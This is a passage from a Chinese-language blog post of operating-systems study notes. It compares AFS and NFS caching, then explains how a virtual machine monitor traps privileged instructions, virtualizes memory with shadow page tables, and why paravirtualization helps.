<li>AFS 受益于在本地磁盘缓存整个文件内容，因此虽然大多数情况下，AFS 和 NFS  的性能差不多，但如果是机器重启后，对文件发起第二次的访问，则 AFS 将胜出，因为 NFS 没有本地磁盘副本，将需要再次通过网络下载文件，导致慢很多；</li>
<li>AFS 另外一个优点是增加了扩展性，因为减少了很多请求的处理，单台服务器能够支持的客户端数量变得更多了；</li>
</ul>
<p>缺点：</p>
<ul>
<li>由于 NFS 缓存的是文件中的某个块，而不是整个文件，因此在某些场景下，它的性能将优于 AFS，即对文件中做出局部修改时，此时 NFS 可以只从服务端拉取对应的块即可，然后改写后推送到服务器；此时 AFS 需要先将整个文件从服务端下载下来，占用了很多时间；另外，改写完后，还需要将整个文件再推送回服务端，如果文件很大的话，速度将会很慢；</li>
</ul>
<blockquote>
<p>没有完美的系统，只有根据工作场景选择最匹配的系统；</p>
<p>貌似 AFS 的机制很像 github 的机制；</p>
</blockquote>
<h2 id="40-虚拟机管理程序"><a href="#40-虚拟机管理程序" class="headerlink" title="40.虚拟机管理程序"></a>40.虚拟机管理程序</h2><blockquote>
<p>VMM：virtual machine monitor，虚拟机管理程序（hypervisor），它可以实现在现在的操作系统中，额外添加一层虚拟化；</p>
</blockquote>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ul>
<li>开发人员：方便在同一台机器上，实现不同 OS 下的代码调试和测试；</li>
<li>普通用户：方便在同一台机器上，使用不同 OS 下的应用程序；</li>
<li>运维人员：提高服务器的硬件资源使用率；</li>
</ul>
<h3 id="虚拟化-CPU"><a href="#虚拟化-CPU" class="headerlink" title="虚拟化 CPU"></a>虚拟化 CPU</h3><p>VMM 的职责需要对安装在其上的虚拟操作系统模拟一切的硬件，包括 CPU、内存、磁盘等；对于普通操作系统，在启动的时候，它会将各种异常处理例程的地址，提前写入到硬件中，以便在发生异常时，硬件可以根据地址，找到异常处理程序来处理异常；对于 VMM 来说，当它启动一个虚拟操作系统时，它需要拦截虚拟操作系统发出的写入异常处理例程的指令，并记录下指令内部的异常处理程序地址；</p>
<blockquote>
<p>由于 CPU 本身是受限直接执行的，因此很好奇 VMM 如何让虚拟 OS 在执行到特权指令后，能够陷入到自己的代码，而不是触发错误？猜测此处需要 CPU 的支持才行，即 CPU 必须支持除了内核模式和用户模式外的第三种甚至第四种模式，虚拟 OS 运行在这种模式中，并且在该模式下，虚拟 OS 发出的特权指令，会触发 VMM 已经提前在 CPU 中写好的自己的异常处理，然后接下来陷入 VMM  的代码，由 VMM 接管并处理虚拟 OS 发出的特权指令；</p>
</blockquote>
<p>由于 CPU 对于内部程序来说是完全透明的，因此应用程序发出的全部是 CPU 可以直接解读和处理的指令集；当 VMM 监控到应用程序发出了系统调用时（如何实现监控？或许可以考虑让虚拟机的应用程序运行在某种特殊的用户模式下），里面其实包含一个触发异常的指令（正常情况下，执行该指令会陷入系统，即切换到操作系统提前指定的异常处理程序，并切换到内核模式）；当 VMM 发现应用程序发出这种指令时，VMM 就拦截它，并替换成之前记录的虚拟 OS 的异常处理程序的地址；CPU 根据该地址，读取内存中对应的异常处理程序，开始处理应用程序发出的系统调用；</p>
<blockquote>
<p>由于虚拟 OS 内部的应用程序也是受限直接执行的，因此当它发出系统调用时，它也应该是要触发 VMM 在 CPU 中提前写入的异常处理程序，让其陷入 VMM 的代码，由 VMM 来接管应用程序发出的系统调用，而不是由陷入主机的 OS 进行处理；</p>
</blockquote>
<h4 id="不同虚拟-OS-之间的切换"><a href="#不同虚拟-OS-之间的切换" class="headerlink" title="不同虚拟 OS 之间的切换"></a>不同虚拟 OS 之间的切换</h4><p>VMM 有可能同时管理着多个虚拟 OS，当想实现不同的虚拟 OS 之间的切换时，VMM 需要记下每个虚拟 OS 的状态，包括各个寄存器、程序计数器（PC）的值等；切换时，VMM 就把这些值写入到 CPU 中的寄存器和 PC 中，这样就实现切换了；</p>
<blockquote>
<p>通过时间分片，CPU 定期陷入到内核模式中，执行 OS 的代码指令；好奇在 VMM 下，由于 VMM 只是一个普通的应用程序，它如何确保分配到足够多的时间片，来运行其中的虚拟 OS 的虚拟应用程序？还是说，这些虚拟的东西加在一起，能够分配到的时间片，只是跟主机上面的应用程序的比例是一样的？</p>
</blockquote>
<h4 id="普通-OS-下的应用程序实现系统调用"><a href="#普通-OS-下的应用程序实现系统调用" class="headerlink" title="普通 OS 下的应用程序实现系统调用"></a>普通 OS 下的应用程序实现系统调用</h4><p>在普通的 OS 环境中，当应用程序想要执行某个系统调用时，它提前先将各项参数准备好，写入寄存器中，然后执行约定好的特殊指令；CPU 在收到这条特殊指令后，找到之前 OS 给它的该特殊指令的映射地址，写入程序计数器，并更新状态为内核模式，接下来舞台就交给 OS 了；</p>
<h4 id="VMM-必须拦截虚拟-OS-的特权操作"><a href="#VMM-必须拦截虚拟-OS-的特权操作" class="headerlink" title="VMM 必须拦截虚拟 OS 的特权操作"></a>VMM 必须拦截虚拟 OS 的特权操作</h4><p>VMM 不可能让虚拟 OS 实现特权操作，因为 VMM 本身也只是一个普通进程，并没有权限去帮忙虚拟 OS 实现任何的特权操作，因此它必须想办法拦截虚拟 OS 发出的各种特权操作，不然如果直接让指令进入 CPU ，会触发异常，并导致程序终止；</p>
<blockquote>
<p>问：如何拦截呢？有一个办法是当虚拟 OS 尝试执行特权操作时，就让它陷入 VMM 中；这样 VMM 就有机会记录到特权操作的内容，知道某个虚拟 OS 的异常处理程序，在内存中的地址；有了这个地址后，VMM 之后就可以扮演成一个硬件的角色；</p>
<p>那如何让虚拟 OS  的特权操作能够陷入到 VMM 中呢？暂时想到的一种办法是让虚拟 OS 运行在某种特定的内核模式下，在该模式下的特权操作，会陷入 VMM 中；</p>
</blockquote>
<h4 id="VMM-必须拦截虚拟应用程序的系统调用"><a href="#VMM-必须拦截虚拟应用程序的系统调用" class="headerlink" title="VMM 必须拦截虚拟应用程序的系统调用"></a>VMM 必须拦截虚拟应用程序的系统调用</h4><p>在普通 OS 下，应用程序的系统调用，会交给 OS 处理；由于 CPU 虚拟化使用的是受限直接执行的技术，因此 VMM 也必须拦截虚拟环境中的应用程序发出的系统调用，不能让它触发 CPU 中的主机 OS 的异常处理程序</p>
<blockquote>
<p>问：如果主机的 OS 和虚拟 OS 版本一样的话，说不定也可以，即虽然操作不正确，但结果可能正确？不过这样做貌似很危险，因为虚拟应用程序在主机 OS 和虚拟 OS 的进程表中的代号并不相同，因此应该并不可行；</p>
</blockquote>
<h4 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h4><p>对于虚拟 OS 中的应用程序来说，需要限制其访问虚拟 OS 的数据，但是此时虚拟 OS 本身也是一个普通的应用程序，它的数据并不是存储在内核段中的；有两种办法可以解决这个问题：</p>
<ul>
<li>额外的内核模式：MIPS 硬件提供了额外的管理员模式，可以让虚拟 OS 存放自己的数据，这些数据对普通应用程序不可访问；</li>
<li>内存保护：VMM 使用页表保护，让虚拟 OS  的数据仅对 OS 可用，对虚拟应用程序则不可访问；（当虚拟应用程序尝试访问虚拟 OS 的数据时，让其陷入 VMM，然后 VMM 检查地址是否合法）</li>
</ul>
<h3 id="虚拟化内存"><a href="#虚拟化内存" class="headerlink" title="虚拟化内存"></a>虚拟化内存</h3><h4 id="虚拟化方式"><a href="#虚拟化方式" class="headerlink" title="虚拟化方式"></a>虚拟化方式</h4><blockquote>
<p>问题：VMM 如何虚拟化内存？</p>
<p>答：莫非 VMM 使用基址映射，来帮忙 CPU 找到真正的 虚拟 OS 的指令地址？正确答案是，VMM 需要提供额外的一层映射，将机器内存虚拟化一层物理内存出来，让虚拟 OS 的地址空间和真正的机器内存之间，实现映射；而且，这种实现必须是透明的；</p>
<p>听上去 VMM 还需要扮演类似 TLB 的地址翻译角色；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201222091406.png"></p>
<p>由于虚拟 OS 可能不止一个，因此 VMM 需要为每个虚拟 OS 维护一张单独的映射表，这张映射表的大小取决于初始化的时候，为虚拟 OS 分配了多少机器内存；然后虚拟 OS 对物理内存的任何写入，都由该映射表转换到对本地机器内存的写入，并在表上记录着映射关系；</p>
<blockquote>
<p>问：地址转换的过程是怎么样子的？</p>
</blockquote>
<h4 id="地址转换过程"><a href="#地址转换过程" class="headerlink" title="地址转换过程"></a>地址转换过程</h4><ul>
<li>CPU 执行应用程序（虚拟OS中的）的指令，发现 TLB 缓存未命中，触发陷阱；</li>
<li>陷入 VMM 的缓存未命中处理程序；VMM 找到之前保存的虚拟 OS TLB 缓存未命中处理程序的地址；加载该地址中的指令到 CPU 中；</li>
<li>CPU 执行虚拟 OS 缓存未命中处理程序：从虚拟地址 VA 中提取 VPN 虚拟页号；查找虚拟 OS 中的页表；如果页号存在并有效，取得物理页号 PFN；更新 TLB（特权操作，将触发陷阱）；</li>
<li>陷入 VMM 的陷阱处理程序；VMM 将虚拟 OS 提交的 VPN 到 FPN 的映射，转换成 VPN 到 MPN 的映射，更新 TLB；返回虚拟 OS；</li>
<li>虚拟 OS 从陷阱返回（非特权指令尝试从陷阱返回，将触发陷阱）；</li>
<li>陷入 VMM；从陷阱返回应用程序；</li>
<li>继续执行原触发陷阱的指令（指令重试），TLB 命中；</li>
</ul>
<blockquote>
<p>从以上过程可以发现，不管是虚拟 OS 中的应用程序，还是虚拟 OS，它们都是运行在非特权模式下的，因此，当它们尝试执行一些特权指令时，都发触发陷阱，陷入 VMM 的陷阱处理程序；</p>
</blockquote>
<p>以上过程是指软件 TLB 的场景，如果是硬件支持的 TLB，则 CPU 将直接和自己内部的 TLB 翻译器打交道，当发生 TLB 未命中时，直接按照页表基址寄存器中的地址，到机器内存中，查找相应的映射，此时 VMM 是没有机会介入的；因此，VMM 必须保存一份影子页表供硬件 TLB 查询，并密切关注虚拟 OS 对页表的所有更改；当发现更新时，第一时间更新影子页表；</p>
<blockquote>
<p>当虚拟 OS 中发生缓存未命中时，其成本要大于主机 OS 的缓存未命中；为了降低成本，一种思路是 VMM 在密切关注虚拟 OS 的页表更新时，存一份类似日志的记录，里面记录着 VPN 到 FPN 并到 MPN 的映射；这样当虚拟 OS 发生缓存未命中时，VMM 直接查询自己的日志，看是否有记录到该 VPN 的映射记录，如果有的话，直接返回 MPN；这样可以省去让虚拟 OS 到它的页表查询映射的环节；</p>
</blockquote>
<h3 id="信息沟"><a href="#信息沟" class="headerlink" title="信息沟"></a>信息沟</h3><h4 id="多个虚拟-OS-的时间片分配"><a href="#多个虚拟-OS-的时间片分配" class="headerlink" title="多个虚拟 OS 的时间片分配"></a>多个虚拟 OS 的时间片分配</h4><p>VMM 并不知道虚拟 OS 的内部状态，由于信息差，它们有时候并一定能达到最高性能的配合状态；例如当 VMM 管理多个操作系统时，有些处于空闲状态，没有任务在其中运行；有些处于繁忙的状态，有很多任务在其中运行；此时如果 VMM 为两个操作分配一样的时间片，将不是效率最高的选择；</p>
<h4 id="重复页清零"><a href="#重复页清零" class="headerlink" title="重复页清零"></a>重复页清零</h4><p>当 OS 为进程提供某个内存页前，通常会将其置零，以免千万信息泄露；但是对于 VMM 来说，这种置零的动作有可能会发生两次，一次由主机 OS 分配页面给 VMM，一次由虚拟 OS 分配页面给其中的进程；两次置零的操作将增加性能成本；</p>
<h4 id="半虚拟化"><a href="#半虚拟化" class="headerlink" title="半虚拟化"></a>半虚拟化</h4><p>半虚拟化：如果操作系统的设计者，知道自己的 OS 将有可能运行在虚拟化的环境中，并因此提前做出相应的设计，以减少信息沟，那么将有可能极大的提高该 OS 在虚拟环境中的运行效率（提高的程度甚至将接近于主机 OS 的运行效率）；</p>
<blockquote>
<p>Docker 使用了操作系统层的虚拟化，它并不是一种完整的系统虚拟机，而是将内核共享给多个独立空间中的应用程序；半虚拟化的例子是 Xen 项目；好奇 Xen 如何实现半虚拟化？</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/" data-id="cm1c2i81a003hpkhp6auxgn1e" data-title="操作系统导论" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; zurück</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">weiter &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dart/" rel="tag">Dart</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kubernetes/" rel="tag">kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/" rel="tag">图像处理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BE%AE%E4%BF%A1/" rel="tag">微信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">服务器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" rel="tag">深度学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%B2%E6%9F%93/" rel="tag">渲染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BE%E8%AE%A1/" rel="tag">设计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/" rel="tag">项目管理</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/C/" style="font-size: 11.43px;">C</a> <a href="/tags/C/" style="font-size: 11.43px;">C++</a> <a href="/tags/Dart/" style="font-size: 10px;">Dart</a> <a href="/tags/Kubernetes/" style="font-size: 10px;">Kubernetes</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/javascript/" style="font-size: 18.57px;">javascript</a> <a href="/tags/kubernetes/" style="font-size: 12.86px;">kubernetes</a> <a href="/tags/python/" style="font-size: 15.71px;">python</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 10px;">前端</a> <a href="/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/" style="font-size: 10px;">图像处理</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 14.29px;">安全</a> <a href="/tags/%E5%BE%AE%E4%BF%A1/" style="font-size: 12.86px;">微信</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">操作系统</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 11.43px;">数据库</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 17.14px;">服务器</a> <a href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" style="font-size: 11.43px;">深度学习</a> <a href="/tags/%E6%B8%B2%E6%9F%93/" style="font-size: 10px;">渲染</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 11.43px;">网络</a> <a href="/tags/%E8%AE%BE%E8%AE%A1/" style="font-size: 12.86px;">设计</a> <a href="/tags/%E8%BD%AF%E4%BB%B6/" style="font-size: 20px;">软件</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 10px;">逆向</a> <a href="/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/" style="font-size: 10px;">项目管理</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">June 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/08/21/%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/">渲染原理</a>
          </li>
        
          <li>
            <a href="/2024/06/22/VirtualDom%20%E7%AE%80%E6%98%93%E5%AE%9E%E7%8E%B0/">VirtualDOM 简易实现</a>
          </li>
        
          <li>
            <a href="/2023/08/19/Vue3/">Vue3</a>
          </li>
        
          <li>
            <a href="/2023/08/18/Vue%20Router%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">Vue Router 基本用法</a>
          </li>
        
          <li>
            <a href="/2023/08/04/Linux%20%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/">Linux 文件权限</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 ccw<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>